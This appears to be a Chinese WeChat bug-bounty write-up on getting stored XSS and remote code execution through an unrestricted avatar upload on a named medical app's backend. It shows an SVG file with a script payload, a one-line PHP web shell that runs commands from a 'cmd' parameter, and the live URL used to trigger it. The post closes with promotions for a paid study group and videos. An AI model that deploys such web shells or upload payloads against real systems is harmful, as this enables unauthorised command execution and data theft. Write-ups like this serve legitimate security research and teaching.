#  通过文件上传所获取的RCE   
Mostafa  迪哥讲事   2023-10-24 12:01  
  
## 正文  
  
本文主要解释的是如何通过文件上传来获取存储类型的XSS和RCE  
## 复现过程  
  
首先以医生的身份创建电子邮件，确认电子邮件并登陆之后，其将我重定向到主页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7zAjJgDpYlEibqnxctTnu13Q1rVskWR8qJreb0obzFz9AicZldn15oyd4xhmxaPZTjPQibBZbMHRriag/640?wx_fmt=png "")  
  
注意到有个上传功能，可以上传头像  
  
这里我们上传头像，使用 Burpsuit 拦截上传过程并将请求发送到中继器(repeater)来查看响应  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7zAjJgDpYlEibqnxctTnu132ibaquwquT4ACXusfEyrDAy3BVMxZrHeGUicicx5b53ZfIn78Msez4Hjg/640?wx_fmt=png "")  
  
这里创建一个包含xss payload的SVG文件:  
```
<?xml version=”1.0" standalone=”no”?>
<!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version=”1.1" baseProfile=”full” xmlns=”http://www.w3.org/2000/svg">
<polygon id=”triangle” points=”0,0 0,50 50,0" fill=”#009900" stroke=”#004400"/>
<script type=”text/javascript”>
alert(“xss”);
</script>
</svg>

```  
  
在站点中上传.svg文件，获取路径并粘贴到浏览器中。请注意上图中的url参数，它是可控的！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7zAjJgDpYlEibqnxctTnu13HkYT4o0cUHs231mAKNMGvtBMhMbR3YkfSfqQdxTBz0Mt5AEZjyB9yA/640?wx_fmt=png "")  
  
这里发现了一个xss  
  
下面将尝试上传一个php文件以获取RCE  
```
<?php
if(isset($_GET[‘cmd’]))
{
system($_GET[‘cmd’]);
}

?>

```  
  
上传之后发现，目标没有对扩展名或者是内容类型进行检查，故这里对SVG文件进行同样的操作，并将其粘贴在浏览器中添加CMD参数  
```
https://backend.dermai.app/storage/2022/10/07/fdd8123d3472face5167b9bd9147d9102594fde9.php?cmd=pwd

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7zAjJgDpYlEibqnxctTnu132rEpls8BZM8ibCp3u4OuECaQrAMKEQpqbaY7oGnbUA5TaFbRjPXukDw/640?wx_fmt=png "")  
  
这里发现起作用了！打完收工!  
  
如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect)  
)，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
## 福利视频  
  
笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品  
  
https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374  
## 技术交流  
  
技术交流请加笔者微信:richardo1o1 (暗号:growing)  
  
  
